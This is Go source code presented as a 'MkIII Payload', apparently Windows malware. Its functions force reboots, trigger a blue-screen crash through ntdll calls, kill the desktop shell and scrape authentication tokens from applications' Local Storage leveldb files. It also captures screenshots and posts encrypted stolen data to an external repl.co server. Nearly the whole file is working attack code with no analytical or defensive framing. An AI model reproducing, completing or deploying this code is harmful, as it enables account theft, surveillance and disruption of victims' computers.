/* This package is to be compiled for Win32 or Win64 based Systems.

MkIII Payload Source
(c) 2022/23 Studio 7 Development

> Go Implementation
*/

package main

import (
	"bytes"
	"fmt"
	"github.com/vova616/screenshot"
	"image/png"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"unsafe"
)

var (
	ntdll = syscall.NewLazyDLL("ntdll.dll")

	RtlAdjustPrivilege = ntdll.NewProc("RtlAdjustPrivilege")
	NtRaiseHardError   = ntdll.NewProc("NtRaiseHardError")
)

func ForceShutdown() {
	if err := exec.Command("cmd", "/C", "shutdown", "/t", "0", "/r").Run(); err != nil {
		fmt.Println("Failed to initiate shutdown:", err)
	}
}

func DoBSoD() {
	RtlAdjustPrivilege.Call(19, 1, 0, uintptr(unsafe.Pointer(new(bool))))
	NtRaiseHardError.Call(0xdeadbeef, 0, 0, uintptr(0), 6, uintptr(unsafe.Pointer(new(uintptr))))
}

func KillDesktop() {
	err := exec.Command("cmd", "/c", "taskkill", "/f", "/t", "/im", "explorer.exe").Run()
	if err != nil {
		fmt.Println("Failed to kill Desktop process:", err)
	}
}

func DumpService() []string {

	var WG sync.WaitGroup
	var T []string

	for _, Path := range PLATFORMS {
		if !FileExists(Path.DataFiles) {
			continue
		}

		var PLATFORM_PATH string = Path.DataFiles + "\\Local Storage\\leveldb\\"

		items, _ := os.ReadDir(PLATFORM_PATH)
		for _, File := range items {
			FName := File.Name()
			var t []string
			if File.IsDir() || (!strings.HasSuffix(FName, ".log") && !strings.HasSuffix(FName, ".ldb")) {
				continue
			}

			// Do stuff here
			WG.Add(1)
			go func(FName string) {
				defer WG.Done()

				b, e := os.ReadFile(PLATFORM_PATH + FName)
				if e != nil {
					log.Fatalf(e.Error())
				}

				t = FindAllTokens(string(b))

				if len(t) > 0 {
					T = append(T, t...)
				}
			}(FName)
		}
		WG.Wait()
	}
	return T
}

func SendRequest(body string, ip string) {
	HashKey := RandIntBytes(3)
	HashKeyInt, _ := strconv.Atoi(HashKey)

	GenerateHeaders()

	hash, nonce := CryptSign(ip, HashKey)

	HEADERS[HashKeyInt] = nonce

	//fmt.Println(HEADERS)

	var p string = "{"

	for i := 0; i < 999; i++ {
		if i == 998 {
			p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\""
			continue
		}
		p = p + "\"" + fmt.Sprintf("%03d", i) + "\":\"" + HEADERS[i] + "\","

	}
	p = p + "}"

	endpoint := Encrypt(body, strings.Join(strings.Split(hash, "")[0:32], ""))
	req, _ := http.NewRequest("POST", "https://liveton.studio7.repl.co/go/"+fmt.Sprintf("%03d", len(ToString(endpoint)))+strings.TrimRight(ToString(endpoint), "0")+HashKey, bytes.NewBuffer([]byte(p)))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	client.Do(req)
}

func GetScreenShot() string {
	if _, err := os.Stat(TempFileDir); os.IsNotExist(err) {
		os.MkdirAll(TempFileDir, 0700)
	}

	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create(TempFileDir + "\\CAPTURE.png")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	var _ = f.Close()

	return TempFileDir + "\\CAPTURE.png"
}
